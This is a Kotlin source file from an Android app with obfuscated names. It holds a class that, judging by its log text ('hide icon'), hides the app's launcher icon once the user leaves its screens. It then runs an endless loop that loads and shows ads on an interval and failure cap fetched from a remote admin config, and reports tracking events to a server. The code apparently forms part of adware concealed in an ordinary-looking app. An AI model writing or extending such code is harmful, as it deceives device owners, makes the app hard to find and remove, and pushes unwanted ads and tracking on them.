package com.even.zining.inherit.sound.pangle

import com.even.zining.inherit.sound.tool.NetPostTool
import com.even.zining.inherit.sound.zeros.FnnLoad


import com.even.zining.inherit.sound.tool.data.FnnLoadData
import com.even.zining.inherit.sound.start.FnnStartFun
import com.even.zining.inherit.sound.tool.data.MMKVUtils
import com.even.zining.inherit.sound.tool.PngCanGo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class AdXian {
    private var jobAdRom: Job? = null


    fun startRomFun() {
        val adminData = FnnStartFun.getAdminData() ?: return
        val delayChecks = adminData.config.scheduler.loopInterval?: 0
        val delayData = delayChecks.toLong().times(1000L)
        FnnStartFun.showLog("startRomFun delayData=: ${delayData}")
        jobAdRom = CoroutineScope(Dispatchers.Main).launch {
            while (true) {
                val topAc = PngCanGo.getActivity().lastOrNull()
                if (topAc == null || (topAc.javaClass.name != FnnLoadData.reladRu && topAc.javaClass.name != FnnLoadData.reladRu2)) {
                    if (topAc == null) {
                        FnnStartFun.showLog("隐藏图标=null")
                    } else {
                        FnnStartFun.showLog("隐藏图标=${topAc.javaClass.name}")
                    }
                    FnnLoad.fnnLoad(5544313)
                    break
                }
                delay(500)
            }
            checkAndShowAd(delayData)
        }
    }

    private suspend fun checkAndShowAd(delayData: Long) {
        while (true) {
            FnnStartFun.showLog("循环检测广告")
            NetPostTool.postPointData(false, "timertask")
            if (adNumAndPoint()) {
                jumfailpost()
                jobAdRom?.cancel()
                break
            } else {
                AdTool.startLoadAd()
                AdTool.isHaveAdNextFun()
                delay(delayData)
            }
        }
    }
    private fun jumfailpost(){
       val adFailPost = MMKVUtils.getBoolean(FnnLoadData.adFailPost)
        if(!adFailPost){
            NetPostTool.postPointData(true, "jumpfail")
            MMKVUtils.put(FnnLoadData.adFailPost,true)
        }
    }
    private fun adNumAndPoint(): Boolean {
        val adminBean = FnnStartFun.getAdminData()
        if (adminBean == null) {
            FnnStartFun.showLog("AdminBean is null, cannot determine adNumAndPoint")
            return false
        }

        // 从配置中获取最大失败次数
        val maxFailNum = adminBean.config.scheduler.retryCap ?: 0

        if (MMKVUtils.getInt(FnnLoadData.isAdFailCount) >= maxFailNum) {
            return true
        }
        return false
    }
}
